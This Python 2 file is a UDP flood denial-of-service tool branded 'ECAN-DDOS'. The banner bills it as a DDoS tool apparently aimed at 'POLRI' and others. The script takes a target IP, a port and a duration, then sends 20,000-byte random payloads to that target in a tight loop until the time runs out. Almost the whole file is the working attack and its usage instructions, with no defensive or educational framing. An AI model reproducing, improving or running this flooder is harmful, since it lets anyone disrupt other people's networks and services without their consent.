import time
import socket
import random
import sys
def usage():
    print "\033[1;32m############################################################"
    print "#-----------------------[\033[1;91mECAN-DDOS\033[1;32m]-----------------------#"
    print "#----------------------------------------------------------#"
    print "#   \033[1;91mCommand: " "python2 destroy.py " "<ip> <port> <packet> \033[1;32m #"
    print "#                                                        ##"
    print "#\033[1;91mCreator:Danendra Djlantik\033[1;32m##      #      #                     ##"
    print "#\033[1;91mVersion:1.0        \033[1;32m##      #      #                     ##"
    print "#\033[1;91mCredit:  Danendra Djlantik   ##"
    print "#                     \033[1;91m ##     \033[1;32m#  \033[1;91m  \033[1;32   ##"
    print "#                     \033[1;91m##  \033[1;32m###   \033[1;91m  \033[1;32m   ##"
    print "#               \033[1;91m<--[HOME ALONE CHILD]-->         \033[1;32m  ##"
    print "############################################################"
    print "    ~This Is The Final Tools Of DDOS-POLRI & Others!"
    print "    !Maked With Love By Danendra"
    
   
def flood(victim, vport, duration):
    # Okey Jadi disini saya membuat server, Ketika saya memanggil "SOCK_DGRAM" itu  menunjukkan  UDP type program
    client = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    # 20000 representasi satu byte ke server
    bytes = random._urandom(20000)
    timeout =  time.time() + duration
    sent = 3000

    while 1:
        if time.time() > timeout:
            break
        else:
            pass
        client.sendto(bytes, (victim, vport))
        sent = sent + 1
        print "\033[1;91mStarting\033[1;32m%s \033[1;91mSendPacket \033[1;32m%s \033[1;91mat port \033[1;32m%s "%(sent, victim, vport)
def main():
    print len(sys.argv)
    if len(sys.argv) != 4:
        usage()
    else:
        flood(sys.argv[1], int(sys.argv[2]), int(sys.argv[3]))

if __name__ == '__main__':
    main()
